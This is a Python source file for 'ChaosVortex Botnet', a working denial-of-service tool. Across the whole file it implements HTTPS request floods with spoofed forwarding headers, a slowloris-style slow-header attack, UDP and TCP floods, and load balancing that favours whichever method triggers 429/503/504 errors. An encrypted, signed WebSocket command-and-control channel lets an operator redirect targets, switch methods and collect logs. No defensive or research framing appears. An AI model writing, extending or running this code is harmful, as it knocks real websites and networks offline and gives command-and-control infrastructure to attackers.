import threading
import socket
import http.client
import ssl
import random
import string
import time
import argparse
import logging
import os
import base64
import json
import websocket
import zlib
from typing import List, Dict
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.hmac import HMAC
from cryptography.hazmat.backends import default_backend

# Setup console logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# In-memory structured logging
log_buffer = []

class ChaosVortex:
    def __init__(self, targets_l7: List[str] = None, targets_l4: List[str] = None, duration: int = 60, threads: int = 30, methods: List[str] = None, c2_url: str = None):
        self.targets_l7 = [t.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0].strip() for t in (targets_l7 or [])]
        self.targets_l4 = targets_l4 or []
        self.duration = duration
        self.threads = max(1, min(threads, 30))
        self.methods = [m for m in (methods or ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]) if m in ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]]
        self.end_time = time.time() + duration
        self.c2_url = c2_url or "ws://127.0.0.1:8765"
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/101.0",
            "curl/8.4.0",
            "Mozilla/5.0 (Android 14; Mobile; rv:103.0) Gecko/103.0 Firefox/103.0"
        ]
        self.success_count = {m: {"total": 0, "impact": 0} for m in self.methods}
        self.response_times = {m: [] for m in ["vortexhttp", "ghostloris"]}
        self.lock = threading.Lock()
        self.private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        self.shared_key = None
        self.hmac_key = None
        self.c2_session = None
        self.c2_nonce = 0
        self.target_pools = {"l7": [], "l4": []}
        self.thread_pool = []
        self.method_load = {m: 0.0 for m in self.methods}

    def _init_c2_session(self):
        for attempt in range(3):
            try:
                logger.debug(f"Attempting C2 connection {attempt+1}/3 to {self.c2_url}")
                ws = websocket.WebSocket()
                ws.connect(self.c2_url, header={"User-Agent": random.choice(self.user_agents)}, timeout=5)
                public_key = self.private_key.public_key().public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                )
                ws.send(base64.b64encode(public_key).decode())
                server_public_key = base64.b64decode(ws.recv())
                server_key = serialization.load_pem_public_key(server_public_key, default_backend())
                shared_secret = self.private_key.exchange(ec.ECDH(), server_key)
                hkdf = HKDF(
                    algorithm=hashes.SHA256(),
                    length=64,
                    salt=os.urandom(16),
                    info=b"chaosvortex_c2",
                    backend=default_backend()
                )
                derived_key = hkdf.derive(shared_secret)
                self.shared_key = derived_key[:32]
                self.hmac_key = derived_key[32:]
                self.c2_session = ws
                log_buffer.append({"ts": time.time(), "level": "INFO", "msg": "C2 session established"})
                logger.info("C2 session established")
                return True
            except Exception as e:
                log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": f"C2 session attempt {attempt+1} failed: {str(e)}"})
                logger.error(f"C2 session attempt {attempt+1} failed: {str(e)}")
                time.sleep(random.uniform(1, 3))
        logger.error("C2 initialization failed after 3 attempts")
        return False

    def _sign_command(self, data: bytes) -> bytes:
        hmac = HMAC(self.hmac_key, hashes.SHA256(), default_backend())
        hmac.update(data)
        return hmac.finalize()

    def _verify_command(self, data: bytes, signature: bytes) -> bool:
        hmac = HMAC(self.hmac_key, hashes.SHA256(), default_backend())
        hmac.update(data)
        try:
            hmac.verify(signature)
            return True
        except:
            return False

    def _encrypt(self, data: bytes) -> bytes:
        compressed = zlib.compress(data)
        iv = os.urandom(12)
        self.c2_nonce = (self.c2_nonce + 1) % (2**64)
        nonce_bytes = self.c2_nonce.to_bytes(12, "big")
        cipher = Cipher(algorithms.AES(self.shared_key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encryptor.authenticate_additional_data(nonce_bytes)
        ciphertext = encryptor.update(compressed) + encryptor.finalize()
        return base64.b64encode(iv + encryptor.tag + nonce_bytes + ciphertext)

    def _decrypt(self, data: bytes) -> bytes:
        try:
            data = base64.b64decode(data)
            if len(data) < 40:  # IV(12) + Tag(16) + Nonce(12)
                raise ValueError("Invalid data length for decryption")
            iv, tag, nonce_bytes, ciphertext = data[:12], data[12:28], data[28:40], data[40:]
            if len(iv) != 12 or len(tag) != 16 or len(nonce_bytes) != 12:
                raise ValueError("Invalid IV, tag, or nonce length")
            cipher = Cipher(algorithms.AES(self.shared_key), modes.GCM(iv, tag), backend=default_backend())
            decryptor = cipher.decryptor()
            decryptor.authenticate_additional_data(nonce_bytes)
            compressed = decryptor.update(ciphertext) + decryptor.finalize()
            return zlib.decompress(compressed)
        except Exception as e:
            logger.error(f"Decryption error: {str(e)}")
            raise

    def _c2_command(self) -> dict:
        try:
            cmd_data = json.dumps({"status": "ready", "heartbeat": int(time.time())}).encode()
            signature = self._sign_command(cmd_data)
            self.c2_session.send(self._encrypt(cmd_data + signature).decode())
            response = self._decrypt(self.c2_session.recv())
            resp_data, resp_sig = response[:-32], response[-32:]
            if self._verify_command(resp_data, resp_sig):
                logger.debug(f"Received C2 command: {resp_data.decode()}")
                return json.loads(resp_data.decode())
            log_buffer.append({"ts": time.time(), "level": "WARNING", "msg": "C2 command signature invalid"})
            logger.warning("C2 command signature invalid")
        except Exception as e:
            logger.error(f"C2 command fetch failed: {str(e)}")
            if self._init_c2_session():
                return self._c2_command()
            log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": f"C2 command fetch failed: {str(e)}"})
        return {"command": "continue"}

    def _random_payload(self, size: int = 48) -> bytes:
        valid_prefixes = [
            b"GET / HTTP/1.1\r\nHost: ",
            b"POST /api/data HTTP/1.1\r\nContent-Length: ",
            b"\x00\x01\x02\x03"
        ]
        prefix = random.choice(valid_prefixes)
        suffix = os.urandom(max(0, size - len(prefix)))
        return prefix + suffix[:size - len(prefix)]

    def _random_path(self) -> str:
        prefixes = ["api/v4", "rest/v2", "graphql/query", "assets/js", "public/css"]
        segments = [''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) for _ in range(1)]
        exts = [".json", ".js", ".css", ".html", ""]
        query = f"?token={''.join(random.choices(string.hexdigits.lower(), k=8))}&ts={int(time.time())}"
        return f"/{random.choice(prefixes)}/{'/'.join(segments)}{random.choice(exts)}{query}"

    def _random_ip(self) -> str:
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def _random_headers(self, target: str) -> dict:
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "X-Forwarded-For": self._random_ip(),
            "Accept": random.choice(["application/json", "text/html", "*/*"]),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Host": target
        }
        if random.random() < 0.6:
            headers["Referer"] = f"https://{target}/{random.choice(['home', 'api', 'login'])}"
        if random.random() < 0.5:
            headers["Origin"] = f"https://{target}"
        return headers

    def _shuffle_targets(self, layer: str) -> List[str]:
        with self.lock:
            targets = self.target_pools[layer][:]
        random.shuffle(targets)
        return targets or [None]

    def _update_load(self, method: str, success: bool):
        with self.lock:
            self.method_load[method] = self.method_load.get(method, 0.5) * 0.9 + (1.0 if success else 0.0) * 0.1

    def _vortexhttp(self):
        targets = self._shuffle_targets("l7")
        while time.time() < self.end_time:
            target = random.choice(targets)
            if not target:
                return
            start_time = time.time()
            try:
                logger.debug(f"Sending HTTP request to {target}")
                conn = http.client.HTTPSConnection(target, 443, timeout=0.5, context=ssl._create_unverified_context())
                headers = self._random_headers(target)
                method = random.choice(["GET", "POST"])
                path = self._random_path()
                body = self._random_payload(24) if method == "POST" else None
                conn.request(method, path, body=body, headers=headers)
                resp = conn.getresponse()
                with self.lock:
                    self.success_count["vortexhttp"]["total"] += 1
                    if resp.status in [429, 503, 504]:
                        self.success_count["vortexhttp"]["impact"] += 1
                    self.response_times["vortexhttp"].append((time.time() - start_time) * 1000)
                    self._update_load("vortexhttp", resp.status in [429, 503, 504])
                conn.close()
                logger.debug(f"HTTP request to {target} completed, status: {resp.status}")
                time.sleep(random.uniform(0.01, 0.05))
            except Exception as e:
                logger.debug(f"HTTP request to {target} failed: {str(e)}")
                self._update_load("vortexhttp", False)
                time.sleep(random.uniform(0.01, 0.05))

    def _ghostloris(self):
        targets = self._shuffle_targets("l7")
        while time.time() < self.end_time:
            target = random.choice(targets)
            if not target:
                return
            start_time = time.time()
            try:
                logger.debug(f"Starting ghostloris on {target}")
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((target, 443))
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                context.set_ciphers(random.choice([
                    "TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-SHA256",
                    "TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256"
                ]))
                context.set_alpn_protocols(["h2", "http/1.1"])
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                sock = context.wrap_socket(sock, server_hostname=target)
                sock.send(f"GET {self._random_path()} HTTP/1.1\r\nHost: {target}\r\n".encode())
                time.sleep(random.uniform(0.05, 0.2))
                sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                time.sleep(random.uniform(0.1, 0.4))
                sock.send(b"Connection: keep-alive\r\n\r\n")
                with self.lock:
                    self.success_count["ghostloris"]["total"] += 1
                    self.success_count["ghostloris"]["impact"] += 1
                    self.response_times["ghostloris"].append((time.time() - start_time) * 1000)
                    self._update_load("ghostloris", True)
                sock.close()
                logger.debug(f"Ghostloris on {target} completed")
                time.sleep(random.uniform(0.01, 0.05))
            except Exception as e:
                logger.debug(f"Ghostloris on {target} failed: {str(e)}")
                self._update_load("ghostloris", False)
                time.sleep(random.uniform(0.01, 0.05))

    def _udpvortex(self):
        targets = self._shuffle_targets("l4")
        while time.time() < self.end_time:
            target = random.choice(targets)
            if not target:
                return
            try:
                logger.debug(f"Sending UDP to {target}")
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ports = [80, 443]
                port = random.choice(ports)
                payload = self._random_payload(96)
                for _ in range(4):
                    sock.sendto(payload[:len(payload)//4], (target, port))
                with self.lock:
                    self.success_count["udpvortex"]["total"] += 1
                    self.success_count["udpvortex"]["impact"] += 1
                    self._update_load("udpvortex", True)
                sock.close()
                logger.debug(f"UDP to {target} sent")
                time.sleep(random.uniform(0.01, 0.05))
            except Exception as e:
                logger.debug(f"UDP to {target} failed: {str(e)}")
                self._update_load("udpvortex", False)
                time.sleep(random.uniform(0.01, 0.05))

    def _tcpvortex(self):
        targets = self._shuffle_targets("l4")
        while time.time() < self.end_time:
            target = random.choice(targets)
            if not target:
                return
            try:
                logger.debug(f"Sending TCP to {target}")
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                ports = [80, 443]
                port = random.choice(ports)
                sock.connect((target, port))
                sock.send(self._random_payload(24))
                with self.lock:
                    self.success_count["tcpvortex"]["total"] += 1
                    self.success_count["tcpvortex"]["impact"] += 1
                    self._update_load("tcpvortex", True)
                sock.close()
                logger.debug(f"TCP to {target} sent")
                time.sleep(random.uniform(0.01, 0.05))
            except Exception as e:
                logger.debug(f"TCP to {target} failed: {str(e)}")
                self._update_load("tcpvortex", False)
                time.sleep(random.uniform(0.01, 0.05))

    def _balance_threads(self):
        total_load = sum(self.method_load.values()) or 1.0
        thread_alloc = {m: max(1, int(self.threads * (self.method_load[m] / total_load))) for m in self.methods}
        remaining = self.threads - sum(thread_alloc.values())
        for m in sorted(self.method_load, key=self.method_load.get, reverse=True):
            if remaining > 0:
                thread_alloc[m] += 1
                remaining -= 1
        return thread_alloc

    def start(self):
        if not self.targets_l7 and not self.targets_l4:
            log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "At least one target required"})
            logger.error("At least one target required")
            return
        with self.lock:
            self.target_pools["l7"] = self.targets_l7[:]
            self.target_pools["l4"] = self.targets_l4[:]
        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"ChaosVortex strike on L7: {self.targets_l7 or 'None'}, L4: {self.targets_l4 or 'None'}, methods: {self.methods}"})
        logger.info(f"ChaosVortex strike on L7: {self.targets_l7 or 'None'}, L4: {self.targets_l4 or 'None'}, methods: {self.methods}")
        if not self._init_c2_session():
            log_buffer.append({"ts": time.time(), "level": "ERROR", "msg": "C2 initialization failed, continuing offline"})
            logger.info("C2 initialization failed, continuing offline")
        c2_thread = threading.Thread(target=self._c2_monitor, daemon=True)
        c2_thread.start()
        while time.time() < self.end_time:
            thread_alloc = self._balance_threads()
            threads = []
            method_funcs = {
                "vortexhttp": self._vortexhttp,
                "ghostloris": self._ghostloris,
                "udpvortex": self._udpvortex,
                "tcpvortex": self._tcpvortex
            }
            for method, count in thread_alloc.items():
                for _ in range(count):
                    t = threading.Thread(target=method_funcs[method], daemon=True)
                    threads.append(t)
                    self.thread_pool.append(t)
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=1.0)
            time.sleep(0.1)
        avg_response = {k: (sum(v)/len(v) if v else 0) for k, v in self.response_times.items()}
        log_buffer.append({"ts": time.time(), "level": "INFO", "msg": f"Vortex complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}"})
        logger.info(f"Vortex complete. Success counts: {self.success_count}, Avg response times (ms): {avg_response}")
        if self.c2_session:
            try:
                compressed_log = zlib.compress(json.dumps(log_buffer[-5:]).encode())
                signature = self._sign_command(compressed_log)
                self.c2_session.send(self._encrypt(compressed_log + signature).decode())
                logger.debug("Sent final log to C2")
                self.c2_session.close()
            except Exception as e:
                logger.error(f"Failed to send final log to C2: {str(e)}")

    def _c2_monitor(self):
        while time.time() < self.end_time:
            cmd = self._c2_command()
            if cmd.get("command") == "stop":
                self.end_time = time.time()
                logger.info("Received stop command from C2")
                break
            elif cmd.get("command") == "update_methods":
                with self.lock:
                    self.methods = [m for m in cmd.get("methods", self.methods) if m in ["vortexhttp", "ghostloris", "udpvortex", "tcpvortex"]]
                    logger.info(f"Updated methods: {self.methods}")
            elif cmd.get("command") == "update_targets":
                with self.lock:
                    self.target_pools["l7"] = cmd.get("targets_l7", self.target_pools["l7"])
                    self.target_pools["l4"] = cmd.get("targets_l4", self.target_pools["l4"])
                    logger.info(f"Updated targets: L7={self.target_pools['l7']}, L4={self.target_pools['l4']}")
            time.sleep(random.uniform(0.1, 0.8))

def main(targets_l7: str, targets_l4: str, duration: int, methods: str, c2_url: str):
    targets_l7 = targets_l7.split(",") if targets_l7 and targets_l7 != "none" else []
    targets_l4 = targets_l4.split(",") if targets_l4 and targets_l4 != "none" else []
    methods = methods.split(",") if methods else []
    vortex = ChaosVortex(targets_l7, targets_l4, duration, threads=30, methods=methods, c2_url=c2_url)
    vortex.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ChaosVortex Botnet")
    parser.add_argument("targets_l7", nargs="?", default=None, help="Comma-separated L7 targets (e.g., http://httpbin.org)")
    parser.add_argument("targets_l4", nargs="?", default=None, help="Comma-separated L4 targets (e.g., 93.184.216.34)")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--methods", type=str, default="vortexhttp,ghostloris,udpvortex,tcpvortex", help="Comma-separated methods")
    parser.add_argument("--c2-url", type=str, default="ws://127.0.0.1:8765", help="WebSocket C2 URL")
    args = parser.parse_args()
    main(args.targets_l7, args.targets_l4, args.duration, args.methods, args.c2_url)
